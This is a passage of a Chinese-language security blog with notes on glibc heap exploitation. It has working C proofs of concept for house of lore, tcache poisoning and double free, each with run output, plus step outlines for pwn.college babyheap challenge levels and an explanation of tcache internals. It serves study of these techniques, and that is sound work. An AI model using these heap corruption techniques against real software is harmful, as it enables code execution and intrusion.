class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> *fd;</span><br><span class="line">    <span class="type">size_t</span> *bk;</span><br><span class="line">&#125;BinChunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *victim_header;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    BinChunk a;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk b;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk fake_freelist[<span class="number">7</span>];		<span class="comment">//on stack</span></span><br><span class="line">    <span class="type">size_t</span> * target;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        fake_freelist[i].bk = &amp;fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">    &#125;       <span class="comment">//fake_freelist[0] =&gt; fake_freelist[1] =&gt; fake_freelist[2] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    victim_header = (<span class="type">char</span>*)victim - <span class="number">0x10</span>;</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(victim);           <span class="comment">//now victim is in unsorted bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);         <span class="comment">//sort victim into smallbin</span></span><br><span class="line">    <span class="comment">//suppose we have UAF to modify victim.bk points to a</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line">    victim[<span class="number">1</span>] = &amp;a; <span class="comment">//UAF</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    a.fd = victim_header;</span><br><span class="line">    a.bk = &amp;b;</span><br><span class="line">    b.fd = &amp;a;</span><br><span class="line">    b.bk = &amp;fake_freelist[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// smallbins[idx] =&gt; victim &lt;=&gt; a &lt;=&gt; b =&gt; fake_freelist[0] =&gt; fake_freelist[1] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);   <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//get victim again and use smallbins to fill tcache</span></span><br><span class="line">    <span class="comment">//tcache[idx] =&gt; fake_freelist[4] =&gt; fake_freelist[3] =&gt; fake_freelist[2] =&gt; fake_freelist[1] =&gt; fake_freelist[0] =&gt;b =&gt;a</span></span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//fetch fake_freelist[4] from tcache</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target = %p\n&quot;</span>,target);</span><br><span class="line">    assert(target == &amp;fake_freelist[<span class="number">4</span>].fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_lore.c -o house_of_lore -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_lore</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">target = 0x7ffd93539ed0</span><br></pre></td></tr></table></figure>
<h2 id="pwn.college">pwn.college</h2>
<h3 id="level1.0">level1.0</h3>
<p>攻击假设:</p>
<p>0.只有<code>malloc</code>,没有<code>calloc</code></p>
<p>1.最多持有16个堆块指针,可以填充<code>tcache</code></p>
<p>2.<code>free</code>之后不清空指针,可以<code>UAF</code></p>
<p>可以考虑 <code>fastbin_dup_with_consolidate</code>的思路</p>
<p>0.填充tcache</p>
<p>1.找一个与topchunk相邻的小堆块,free进入fastbins</p>
<p>2.read_flag发起0x52A字节的分配请求,合并fastbins堆块到topchunk,并拿到flag_chunk</p>
<p>3.直接从小堆块上UAF,puts即可泄露flag</p>
<h3 id="level2">level2</h3>
<p>攻击假设:</p>
<p>0.有malloc也有calloc, malloc最大0x420, calloc无限制</p>
<p>1.free不清空指针,UAF</p>
<ol start="2" type="1">
<li></li>
</ol>
<h3 id="level4.0">level4.0</h3>
<p>最小3000字节的堆块</p>
<p>只能考虑largebins和unsortedbin的利用方法</p>
<p>目标是将<code>authenticated @ 0x4041C0</code>写上任意值</p>
<p>步骤:</p>
<p>大于3000字节的largebin,比如<code>0xbc0-0xbf0</code></p>
<p>可以申请0xbd0,0xbe0</p>
<p>1.A = malloc(0xbe0)</p>
<p>barrier</p>
<p>2.B = malloc(0xbe0)</p>
<p>barrier</p>
<p>3.C = malloc(0xbd0)</p>
<p>barrier</p>
<p>3.free(A),free(B)进入largebin,UAF泄露bin地址和堆块地址</p>
<p>4.malloc(0xbe0)拿一个出来,剩下一个</p>
<p>5.UAF将authenticated挂到bk_nextsize上</p>
<p>6.free(C)</p>
<h3 id="level5.0">level5.0</h3>
<p>有越界写</p>
<p>1.UAF泄露堆块基地址</p>
<p>2.根据相对偏移量计算得到flag_chunk的地址</p>
<p>如何将alloc_struct放到堆块里?</p>
<h3 id="level6.0">level6.0</h3>
<h3 id="level7.0">level7.0</h3>
<p>禁用tcache</p>
<p>泄露flag地址</p>
<p>fastbin利用,有UAF,</p>
<h3 id="level8.0">level8.0</h3>
<p>最大申请0x1000</p>
<p>堆风水:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">A</span><br><span class="line">----------------</span><br><span class="line">flag</span><br><span class="line">----------------</span><br><span class="line">B</span><br><span class="line">----------------</span><br><span class="line">C</span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>1.通过B构造<code>C-&gt;prev_size</code>并通过<code>off-by-one</code>将<code>C-&gt;prev_in_use</code>
归0</p>
<p>2.在A中构造假的堆块头,这需要设置<code>fd</code>和<code>bk</code>指针</p>
<p>3.<code>free C</code>,向前合并到<code>A</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/T%E6%93%A6%E8%BD%A6/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:24:00 / Modified: 23:24:35" itemprop="dateCreated datePublished" datetime="2024-10-17T23:24:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="t擦车">T擦车</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college</span><br><span class="line">scp -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college:/challenge/babyheap_level15.0  .</span><br></pre></td></tr></table></figure>
<h2 id="tcache数据结构与算法">tcache数据结构与算法</h2>
<h3 id="glibc-2.27">glibc-2.27</h3>
<h4 id="datastructure">datastructure</h4>
<p>在<code>glibc-2.27</code>上<code>Tcache</code>长这样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241009161233717.png"
alt="image-20241009161233717" />
<figcaption aria-hidden="true">image-20241009161233717</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//每个线程有一个tcache,因此tcache的线程实例名叫tcache_perthread_struct</span></span><br><span class="line"><span class="comment">//counts和entries是冗余的,只是为了性能所以使用了counts计数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">//每个tcache有TCACHE_MAX_BINS = 64 个桶子</span></span><br></pre></td></tr></table></figure>
<p>显然每个桶子里面的<code>chunk</code>大小不一样,并且和桶子下标<code>idx</code>有映射关系,具体来说是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk size convert to tcache index:</span><br><span class="line">csize2tidx(csize) = (csize<span class="number">-0x11</span>) &gt;&gt; <span class="number">4</span> </span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>tcache下标</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x40</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p>在<code>amd64</code>上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">0x8</span></span><br><span class="line">MALLOC_ALIGNMENT = <span class="number">0x10</span></span><br><span class="line">MINSIZE = <span class="number">0x20</span></span><br><span class="line">MIN_CHUNK_SIZE = <span class="number">0x20</span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="algorithm">algorithm</h4>
<h5 id="malloc">malloc</h5>
<p><code>glibc</code>在<code>2.26</code>之后,
引入了<code>TCACHE</code>机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    checked_request2size(bytes, tbytes);</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//计算tcache桶下标</span></span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins			<span class="comment">//下标最高是TCACHE_MAX_BINS = 64</span></span><br><span class="line">        <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">        &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)	<span class="comment">//tc_idx下标桶子里至少有一个堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);	<span class="comment">//从桶子里拿一个堆块返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>没有任何嵌套, 零帧起手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];		<span class="comment">//FIFO栈</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);				<span class="comment">//再确保一下没有越界</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);				<span class="comment">//再确保一下至少有一个堆块</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;				<span class="comment">//下一个块成为头块</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);						<span class="comment">//块计数-1</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;								<span class="comment">//返回堆块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个过程中<code>tcache-&gt;counts[tc_idx]</code>只是随手一记录,并没有根据其值判断是否还有堆块</p>
<p>真正的判断是根据桶子头指针是否为空决定的</p>
<p>当一个堆块返回到<code>tcache</code>中时, 如果可以<code>UAF</code>,
那么就可以把任意假的堆块塞进去</p>
<p>写个poc意思一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *chunk2;</span><br><span class="line">    <span class="type">size_t</span> *chunk3;</span><br><span class="line">    <span class="type">size_t</span> *chunk4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk1;        <span class="comment">//UAF , chunk1 link fake_chunk1 into tcache</span></span><br><span class="line">    fake_chunk1[<span class="number">0</span>] = fake_chunk2;   <span class="comment">//fake_chunk1 link fake_chunk2 into tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous chunk1</span></span><br><span class="line">    chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk1</span></span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk1: %p\n&quot;</span>, fake_chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk2: %p\n&quot;</span>, fake_chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2: %p\n&quot;</span>, chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk3: %p\n&quot;</span>, chunk3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk4: %p\n&quot;</span>, chunk4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 227.c -o 227 -no-pie -g -O0 -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span></span><br><span class="line">fake_chunk1: <span class="number">0x24dd280</span></span><br><span class="line">fake_chunk2: <span class="number">0x24dd2a0</span></span><br><span class="line">chunk2: <span class="number">0x24dd260</span></span><br><span class="line">chunk3: <span class="number">0x24dd280</span></span><br><span class="line">chunk4: <span class="number">0x24dd2a0</span></span><br></pre></td></tr></table></figure>
<p>并且调试观察当<code>chunk2 = malloc(0x10);</code>之后<code>tcache-&gt;count[tc_idx] = 0</code></p>
<p>接着当<code>chunk3 = malloc(0x10);</code>之后,<code>tcache-&gt;count[tc_idx] = 255</code>,发生了整数下溢</p>
<p>只能说<code>glibc-2.27</code>上的<code>tcache</code>是很简陋的</p>
<h5 id="free">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;	<span class="comment">//放回堆块到tcache时根据counts决定对应桶是否已经存满</span></span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p><code>tcache-&gt;counts[tc_idx]</code>终于发挥作用了,原来是不想遍历链表统计堆块个数,直接看<code>counts</code>偷懒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>free</code>时根本没有检查,
甚至名目仗胆的<code>double free</code>都没事,
写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk);<span class="comment">//就是明目张胆double free</span></span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    </span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># ldd 227_df</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff22cdd000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f9b9aab4000</span>)</span><br><span class="line">        /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f9b9ae68000</span>)</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span>_df</span><br><span class="line">chunk1 @ <span class="number">0xf6d260</span></span><br><span class="line">chunk2 @ <span class="number">0xf6d260</span></span><br></pre></td></tr></table></figure>
<h3 id="glibc-2.31">glibc-2.31</h3>
<h4 id="datastructure-1">datastructure</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>			<span class="comment">//如果key等于glibc既定key值说明本堆块是已经被释放的</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>glibc-2.29</code>之后,
<code>tcache_entry</code>结构中加入了一个key字段,
当使用<code>tcache_put</code>把堆块挂到<code>tcache</code>中时,
其<code>key</code>字段均被设置为<code>tcache</code>的地址</p>
<p>以<code>glibc-2.31</code>为例</p>
